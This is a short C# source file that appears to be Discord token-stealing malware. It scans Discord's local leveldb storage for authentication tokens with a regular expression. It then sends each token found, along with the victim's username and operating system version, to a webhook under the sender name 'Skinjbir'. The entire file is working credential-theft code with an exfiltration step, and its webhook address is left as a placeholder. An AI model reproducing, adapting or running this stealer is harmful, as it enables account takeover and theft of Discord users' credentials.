using System;
using System.Collections.Specialized;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;

/*
Author:anas aka ZeroMemory

github : https://github.com/ZeroM3m0ry
 */
class ZeroMemory
{

    public static void Main()
    {

        string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb";
        Regex regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");

        string[] dbfiles = Directory.GetFiles(path, "*.ldb", SearchOption.AllDirectories);

        if (Directory.Exists(path))
        {
            foreach (var file in dbfiles)
            {
                FileInfo info = new FileInfo(file);
                string contents = File.ReadAllText(info.FullName);
                Match match = regex.Match(contents);
                if (match.Success)
                {
                    Discord.Send("Token : " + match.Value + "\nUserName : " + Environment.UserName + "\nOS : " + Environment.OSVersion);
                }
            }
        }
        else
        {
            System.Environment.Exit(1);
        }

    }
    public class Discord
    {
        public class Http
        {
            public static byte[] Post(string url, NameValueCollection pairs)
            {
                using (WebClient webClient = new WebClient())
                    return webClient.UploadValues(url, pairs);
            }
        }
        public static void Send(string content)
        {
            string webHookUrl = "webhook";
            Http.Post(webHookUrl, new NameValueCollection()
            {
                {
                    "content", content
                },

                {
                    "username", "Skinjbir"
                },

                {
                    "avatar_url", "https://i.imgur.com/jFZIN2t.jpg"
                }

            });
        }


    }
}
